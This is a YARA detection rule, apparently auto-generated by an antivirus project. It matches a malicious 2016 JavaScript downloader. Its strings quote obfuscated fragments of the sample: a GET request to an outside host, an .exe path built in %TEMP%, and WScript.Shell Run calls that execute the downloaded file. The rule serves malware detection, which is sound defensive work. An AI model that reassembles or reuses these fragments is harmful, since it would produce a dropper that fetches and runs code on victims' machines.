rule sig_20160328_0e583eb1dfa77fdb6f54b346cec6412d {
  meta:
    description = "datamaliciousorder - file 20160328_0e583eb1dfa77fdb6f54b346cec6412d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1a3e192d0ac36de733200878f7a5da290844fb24c57b8581680819ef0c4c9e16"

  strings:
    $s1  = "function Mzazzyvg() {return Zttjxkxd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"A9jhSARVh.exe\";};" fullword ascii
    $s2  = "Rhjvcfbzj[Rrgwilymq](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Qrgcptu](Srssjisl() * 11)} while (Rhjvcfbzj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Oqyveofplg(Jqubbpgyta, Znqvsfiudf){return Jqubbpgyta - Znqvsfiudf;};" fullword ascii
    $s5  = "var Zttjxkxd = function Kcgbssefn() {return WScript[Oubvbp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Eamiaact() {return ((Liwef == true) && (Liwef == Rdauhh)) ? 1 : Rfpelc;};" fullword ascii
    $s7  = "Rdauhh = true; " fullword ascii
    $s8  = "function Swxtbwkrd(){return Twgxlgmc;};" fullword ascii
    $s9  = " while (Bkfnqr){" fullword ascii
    $s10 = "return Oqyveofplg(Vinryolhz, Oltko);" fullword ascii
    $s11 = "Liwef = true; " fullword ascii
    $s12 = "function Srssjisl(){return 22;};" fullword ascii
    $s13 = "var Dicqenex = new this[\"Date\"]();" fullword ascii
    $s14 = "function Qiwfq()" fullword ascii
    $s15 = "var Dyprl = false;" fullword ascii
    $s16 = "var Rdauhh = false;" fullword ascii
    $s17 = "function Parubifvm(Uhyjj) {var Xzsgeym = (1, 2, 3, 4, 5, Uhyjj); return Xzsgeym;};" fullword ascii
    $s18 = "function Qgkkvzc(){return Oubvbp;};" fullword ascii
    $s19 = "var Liwef = false;" fullword ascii
    $s20 = "function Uphizekgt(Wcafzjy){Zttjxkxd[\"Run\"](Wcafzjy, Rfpelc, Rfpelc);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}